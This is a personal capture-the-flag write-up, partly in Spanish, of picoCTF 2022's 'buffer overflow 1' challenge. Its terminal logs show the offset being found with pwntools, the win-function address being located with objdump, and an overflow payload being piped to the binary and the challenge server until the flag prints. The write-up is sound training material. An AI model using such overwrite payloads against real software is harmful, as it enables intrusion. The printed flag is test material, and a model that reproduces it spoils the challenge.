# Binary Explotation

## Descripcion

Control the return address

Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/252/vuln). You can view source [here](https://artifacts.picoctf.net/c/252/vuln.c). And connect with it using `nc saturn.picoctf.net 62184`

## Pistas (Si hay)



## Solución

``` Bash

Terminal 1:

┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ chmod +x vuln
                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: done                echo  | 
zsh: segmentation fault  ./vuln
                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb\xf6\x91\x04\x08' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x491f662
zsh: done                echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb\xf6\x91\x04\x08' | 
zsh: segmentation fault  ./vuln
                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb\xf6\x91\x04\x08' | nc saturn.picoctf.net 62184
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x491f662
                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb\xf6\x91\x04\x08' | nc saturn.picoctf.net 62184
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x491f662
                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb\xf6\x91\x04\x08' | nc saturn.picoctf.net 62184
saturn.picoctf.net [18.217.86.78] 62184 (?) : Connection refused
                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ 
                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb\xf6\x91\x04\x08' | nc saturn.picoctf.net 54721
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x491f662
                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: done                echo  | 
zsh: segmentation fault  ./vuln
                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb\xf6\x91\x04\x08' | ./vuln                     
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x491f662
zsh: done                echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb\xf6\x91\x04\x08' | 
zsh: segmentation fault  ./vuln
                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ ls -la
total 40
drwxr-xr-x 2 kali kali  4096 Nov 26 00:06  .
drwxr-xr-x 5 kali kali  4096 Nov 25 23:17  ..
-rw-r--r-- 1 kali kali   401 Nov 25 23:36 'buffer overflow 1.md'
-rw-r--r-- 1 kali kali   200 Nov 26 00:05  exp.py
-rw-r--r-- 1 kali kali  1024 Nov 26 00:06  .exp.py.swp
-rwxr-xr-x 1 kali kali 15704 Mar 15  2022  vuln
-rw-r--r-- 1 kali kali   769 Mar 15  2022  vuln.c
                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ echo 'flag{dummieflag}' > flag.txt                                           
                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb\xf6\x91\x04\x08' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x491f662
zsh: done                echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb\xf6\x91\x04\x08' | 
zsh: segmentation fault  ./vuln
                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb\xf6\x91\x04\x08' | nc saturn.picoctf.net 54721
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x491f662
                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 54721
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_c76b273b} 

Terminal 2: ┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ python3                                      
Python 3.10.8 (main, Nov  4 2022, 09:21:25) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> cyclyc_find(0x6161616x)
File "<stdin>", line 1
    cyclyc_find(0x6161616x)
                        ^
SyntaxError: invalid hexadecimal literal
>>> cyclyc_find(0x6161616c)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'cyclyc_find' is not defined
>>> cyclyc_find(0x6161616c)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'cyclyc_find' is not defined
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> cyclyc_find(0x6161616c)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'cyclyc_find' is not defined
>>> cyclic_find(0x6161616c)
44
>>> 'A'*44
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
>>> cyclic_find(0x491f662)
-1
>>> 'A'*-1
''
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
>>> 

Terminal 3:

┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ nano exp.py

Terminal 4:

┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 1]
└─$ objdump -D vuln -M intel | grep 'win'         
080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>


```

## Referencias